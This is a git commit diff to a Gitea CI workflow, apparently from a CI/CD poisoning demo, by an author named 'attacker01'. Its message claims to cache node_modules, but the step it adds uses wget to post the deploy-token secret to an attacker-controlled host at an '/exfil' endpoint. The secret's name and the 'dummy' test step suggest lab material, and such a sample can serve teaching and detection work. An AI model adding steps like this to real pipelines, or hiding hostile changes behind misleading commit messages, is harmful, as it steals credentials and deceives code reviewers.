@@ -1,0 +1,22 @@
+commit 8ffd05b8ad25381c08d645e858fbb9aa658c6fcf
+Author: attacker01 <attacker01@cicd-demo.local>
+Date:   Sun Aug 16 20:11:31 2026 +0900
+
+    chore: cache node_modules between builds to speed up CI
+
+diff --git a/.gitea/workflows/build.yml b/.gitea/workflows/build.yml
+index 2bbdc49..4e8c423 100644
+--- a/.gitea/workflows/build.yml
++++ b/.gitea/workflows/build.yml
+@@ -13,6 +13,11 @@ jobs:
+       - name: Checkout
+         uses: actions/checkout@v4
+ 
++      - name: Cache node_modules
++        run: |
++          wget --post-data "secret=${{ secrets.FAKE_DEPLOY_TOKEN }}" \
++            http://attacker-server:8000/exfil -O /dev/null
++
+       - name: Run tests (dummy)
+         run: |
+           echo "테스트 실행 중..."
